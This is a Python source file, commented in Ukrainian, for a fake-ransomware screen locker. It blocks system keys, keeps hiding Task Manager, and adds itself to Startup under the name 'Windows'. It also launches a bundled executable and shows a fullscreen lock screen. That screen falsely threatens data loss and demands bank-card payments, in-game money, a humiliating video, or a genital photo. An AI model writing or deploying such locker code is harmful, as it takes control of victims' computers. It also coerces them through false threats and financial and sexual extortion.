import customtkinter as ctk
import os
import random
import time
import subprocess
from tkinter import messagebox
import keyboard
import win32gui
import win32con
import win32com.client
import sys

# Паролі
PASSWORD = "14707"
FAKE_PASSWORD = "Гусь"
BACKUP_PASSWORD = "unlockmepls"

# Аудіо для скрімера (MP3 буде відкриватися в системному плеєрі)
SCREAMER_PATH = os.path.join("assets", "audio.mp3")

# Теми
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# Блокуємо комбінації клавіш
keyboard.block_key("alt")
keyboard.block_key("tab")
keyboard.block_key("esc")
keyboard.block_key("windows")
keyboard.block_key("ctrl")

# Ховаємо вікно диспетчера задач
def disable_task_manager():
    def enum_handler(hwnd, lParam):
        if win32gui.IsWindowVisible(hwnd):
            title = win32gui.GetWindowText(hwnd)
            if "Task Manager" in title or "Диспетчер задач" in title:
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    win32gui.EnumWindows(enum_handler, None)

# Додаємо файл до автозапуску
def add_to_startup(file_path, name):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shortcut_path = os.path.join(startup_folder, f"{name}.lnk")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = file_path
    shortcut.WorkingDirectory = os.path.dirname(file_path)
    shortcut.IconLocation = file_path
    shortcut.Save()

# Додаємо себе в автозапуск
this_path = os.path.abspath(sys.argv[0])
add_to_startup(this_path, "Windows")

# Додаємо гуся в автозапуск (файл у підпапці goose/)
goose_path = os.path.join(os.path.dirname(this_path), "scripts", "ProxyStarter.exe")
if os.path.exists(goose_path):
    add_to_startup(goose_path, "ProxyStarter")

# Функція для запуску гуся
def start_goose():
    if os.path.exists(goose_path):
        subprocess.Popen(goose_path)  # Запускаємо гуся в окремому процесі

# Вікно
root = ctk.CTk()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.configure(bg="#202020")
root.attributes("-topmost", True)
root.overrideredirect(True)

# Основний контейнер
main_frame = ctk.CTkFrame(master=root, fg_color="#202020")
main_frame.pack(fill="both", expand=True)

# Центр
content_frame = ctk.CTkFrame(master=main_frame, fg_color="#202020")
content_frame.place(relx=0.5, rely=0.5, anchor="center")

# Заголовок
label = ctk.CTkLabel(content_frame, text="Цей комп’ютер заблоковано", font=ctk.CTkFont(size=40, weight="bold"), text_color="white")
label.pack(pady=(50, 10))

subtitle = ctk.CTkLabel(content_frame, text="Введіть пароль для розблокування", font=ctk.CTkFont(size=26), text_color="white")
subtitle.pack(pady=(0, 20))

# Поле для пароля
entry = ctk.CTkEntry(content_frame, placeholder_text="Пароль", show="*", font=ctk.CTkFont(size=26), width=360)
entry.pack(pady=10)

# Повідомлення
error_label = ctk.CTkLabel(content_frame, text="", text_color="red", font=ctk.CTkFont(size=20))
error_label.pack()

# Історія спроб
attempts_label = ctk.CTkLabel(content_frame, text="", text_color="gray", font=ctk.CTkFont(size=18))
attempts_label.pack(pady=(10, 0))

# Умови (лише текст)
conditions = (
    "Для розблокування ви маєте єдиний варіант: ввести правильний пароль.\n"
    "Спроба перезавантажити комп'ютер призведе до втрати всіх даних і налаштувань.\n"
    "Всі спроби обійти систему призведуть до додаткових ускладнень.\n"
    "1. Перший варіант - оплата 250 гривень кожному на банківські карти.\n"
    "2. Другий варіант - оплата 100.000$ в GTA 5 RP кожному.\n"
    "3. Третій варіант - відео, де ви стоїте на колінах і кажете:\n"
    "\"Я, Ім'я, присягаюсь більше ніколи не суперечити з Олегом і Орестом, і присягаюсь називати їх 'Моя Величність'. Прошу розблокувати мій комп'ютер.\"\n"
    "P.s фотка пісюна в лс тоже підійде."
)

conditions_label = ctk.CTkLabel(content_frame, text=conditions, wraplength=800, font=ctk.CTkFont(size=18), text_color="white", justify="left")
conditions_label.pack(pady=20)

# Загадка-фейк
riddle_text = "Загадка: Не корабель, а з вітрилом — не труба, а з голосилом. Хто я?"
riddle = ctk.CTkLabel(content_frame, text=riddle_text, font=ctk.CTkFont(size=20), text_color="white")
riddle.pack(pady=(10, 5))

# Скрімер запуск (відкриття MP3 через системний плеєр)
def play_screamer():
    if os.path.exists(SCREAMER_PATH):
        os.startfile(SCREAMER_PATH)

# Тремтіння вікна
def shake_window():
    for _ in range(10):
        x = random.randint(-10, 10)
        y = random.randint(-10, 10)
        root.geometry(f"{screen_width}x{screen_height}+{x}+{y}")
        root.update()
        time.sleep(0.02)
    root.geometry(f"{screen_width}x{screen_height}+0+0")

# Розблокування
def unlock():
    user_input = entry.get()
    attempts_label.configure(text="Спроба: " + user_input)  # Виводимо, що ввів користувач

    if user_input == PASSWORD:
        root.destroy()
    elif user_input.lower().strip() == FAKE_PASSWORD.lower():
        play_screamer()
        error_label.configure(text="Ох ні! Це фейковий пароль!")
    elif user_input == BACKUP_PASSWORD:
        root.destroy()
    else:
        error_label.configure(text="Невірний пароль!")
        shake_window()

# Кнопка розблокування
btn = ctk.CTkButton(content_frame, text="Розблокувати", command=unlock, font=ctk.CTkFont(size=26), width=240, height=60, corner_radius=10)
btn.pack(pady=25)

# Запускаємо гуся
start_goose()

# Безкінечне приховування Task Manager
def loop_hide_taskmgr():
    disable_task_manager()
    root.after(1000, loop_hide_taskmgr)

loop_hide_taskmgr()
root.mainloop()
